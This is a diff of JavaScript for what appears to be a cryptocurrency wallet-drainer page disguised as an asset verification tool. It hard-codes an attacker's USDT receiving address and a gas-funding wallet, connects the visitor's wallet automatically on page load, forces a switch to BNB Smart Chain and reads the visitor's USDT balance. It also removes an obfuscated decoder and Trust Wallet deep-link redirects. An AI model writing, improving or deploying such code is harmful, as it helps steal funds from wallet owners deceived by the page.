@@ -1,25 +1,3 @@
-  const _0x1b5be5 = _0x3140;
-        (function (_0x12cc9b, _0x2789ae) {
-            const _0x5c24bd = _0x3140,
-                _0x5a43f4 = _0x12cc9b();
-            while (!![]) {
-                try {
-                    const _0x1867c4 =
-                        (-parseInt(_0x5c24bd(0xeb)) / 0x1) * (parseInt(_0x5c24bd(0xa7)) / 0x2) +
-                        (parseInt(_0x5c24bd(0xa6)) / 0x3) * (-parseInt(_0x5c24bd(0xb6)) / 0x4) +
-                        -parseInt(_0x5c24bd(0xba)) / 0x5 +
-                        -parseInt(_0x5c24bd(0xa4)) / 0x6 +
-                        (parseInt(_0x5c24bd(0x94)) / 0x7) * (-parseInt(_0x5c24bd(0xea)) / 0x8) +
-                        parseInt(_0x5c24bd(0xa1)) / 0x9 +
-                        parseInt(_0x5c24bd(0xb4)) / 0xa;
-                    if (_0x1867c4 === _0x2789ae) break;
-                    else _0x5a43f4["push"](_0x5a43f4["shift"]());
-                } catch (_0x57d290) {
-                    _0x5a43f4["push"](_0x5a43f4["shift"]());
-                }
-            }
-        })(_0x17fe, 0x6eebb);
-
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
@@ -27,33 +5,11 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USD
 let web3;
 let userAddress;
 
- // Connect Wallet with iOS Support
-        async function connectWallet() {
-            const _0x4aa6d2 = _0x1b5be5;
-
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            const isTrustWallet = window.ethereum && window.ethereum.isTrust;
-
-            if (isIOS && !window[_0x4aa6d2(0xb5)]) {
-                const link = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(
-                    window.location.href
-                )}`;
-                window.location.href = link;
-
-                setTimeout(() => {
-                    if (!window[_0x4aa6d2(0xb5)]) {
-                        alert(
-                            "\uD83D\uDD17 Please open in Trust Wallet browser or connect manually."
-                        );
-                    }
-                }, 2000);
-                return;
-            }
-
+async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_accounts" });
+            await window.ethereum.request({ method: "eth_requestAccounts" });
 
             // Force switch to BNB Smart Chain
             await window.ethereum.request({
@@ -73,42 +29,15 @@ let userAddress;
     }
 }
 
-// Auto-connect on page load (iOS & Android)
-        window.addEventListener('load', async () => {
-            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            const isAndroid = /Android/i.test(navigator.userAgent);
-            const hasEth = Boolean(window.ethereum);
-            const isTrust = hasEth && window.ethereum.isTrust;
+// Auto-connect wallet on page load
+window.addEventListener("load", connectWallet);
 
-            if (isTrust) {
-                // Already in Trust Wallet DApp browser → connect immediately
-                await connectWallet();
-            }
-            else if ((isIOS || isAndroid) && !hasEth) {
-                // On mobile Safari/Chrome & no injected provider → deep-link into Trust Wallet
-                const deepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)
-                    }`;
-                window.location.href = deepLink;
+async function verifyAssets() {
+    if (!web3 || !userAddress) {
+        alert("Wallet not connected. Refresh the page.");
+        return;
+    }
 
-                // Fallback if user doesn’t arrive in time
-                setTimeout(() => {
-                    if (!window.ethereum) {
-                        alert("🔗 Please open this page in the Trust Wallet DApp browser.");
-                    }
-                }, 2000);
-            }
-        });
-
- async function Next() {
-            const _0x3ddf57 = _0x1b5be5;
-            
-            if (!web3 || !userAddress) {
-                await connectWallet();
-                if (!web3 || !userAddress) {
-                    alert("Wallet not connected. Refresh the page.");
-                    return;
-                }
-            }
     const usdtContract = new web3.eth.Contract([
         { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
@@ -226,4 +155,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("Next").addEventListener("click", Next);
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
